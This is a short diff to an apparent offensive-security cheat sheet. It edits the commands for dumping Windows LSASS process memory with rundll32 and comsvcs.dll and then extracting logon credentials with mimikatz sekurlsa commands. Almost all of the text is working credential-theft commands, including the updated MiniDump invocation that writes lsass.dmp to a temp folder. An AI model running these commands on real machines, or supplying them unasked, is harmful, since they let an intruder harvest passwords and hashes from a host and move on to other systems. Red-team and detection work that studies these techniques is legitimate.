@@ -30,9 +30,7 @@ sekurlsa::minidump C:\Windows\temp\dumpert.dmp
 sekurlsa::logonpasswords
 
 ***** Dump LSASS with rundll32 *****
-rundll32.exe C:\Windows\System32\comsvcs.dll #24 "<PID> lsass.dmp full"
-rundll32.exe comsvcs.dll #24 "<PID> lsass.dmp full"
-@vysecurity 
-
+from powershell:
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
 
 
